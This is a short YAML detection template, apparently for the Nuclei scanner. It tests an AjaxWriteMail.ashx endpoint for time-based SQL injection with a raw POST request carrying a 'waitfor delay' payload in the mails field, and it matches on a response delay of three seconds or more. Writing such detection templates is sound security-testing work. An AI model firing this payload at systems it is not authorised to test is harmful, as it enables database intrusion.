id: sql-injection-delay
info:
  name: SQL Injection Vulnerability with Time Delay
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Detects SQL Injection vulnerabilities based on time delay responses. The request includes payloads that cause a delay in the response if the target is vulnerable.

http:
  - raw:
      - |
        POST /m/Dingding/Ajax/AjaxWriteMail.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: UserCookie={"empId":"SQLI_POC","corpId": "1"}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        method=updateLastedContactTable&mails=1'waitfor delay'0:0:3'-- -

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration >= 3"